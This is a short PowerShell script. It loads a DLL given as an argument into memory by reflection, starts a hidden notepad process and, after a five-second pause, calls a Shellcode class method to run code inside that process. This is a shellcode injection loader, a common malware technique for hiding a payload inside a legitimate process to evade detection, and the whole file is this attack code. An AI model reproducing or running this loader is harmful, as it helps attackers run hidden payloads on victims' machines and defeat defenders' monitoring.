$DLLName = $args[0];
$DLLbytes = [System.IO.File]::ReadAllBytes($DLLName)
[System.Reflection.Assembly]::Load($DLLBytes)
Start-Process -FilePath notepad -WindowStyle Hidden
Start-Sleep -s 5
[Shellcode]::Exec("notepad")
